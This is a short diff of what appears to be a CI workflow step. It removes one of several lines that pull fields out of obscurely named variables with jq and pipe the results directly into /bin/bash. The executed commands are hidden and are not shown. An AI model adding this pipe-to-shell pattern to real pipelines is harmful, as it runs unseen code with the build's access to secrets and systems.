@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$nkx6" | jq -r .pw397 | /bin/bash
           echo $c1705 | jq -r .z31384 | /bin/bash
-          printf '%s' "$a8650" | jq -r .j4873 | /bin/bash
           echo $pla151 | jq -r .dhl138 | /bin/bash
 
       - name: Upload results
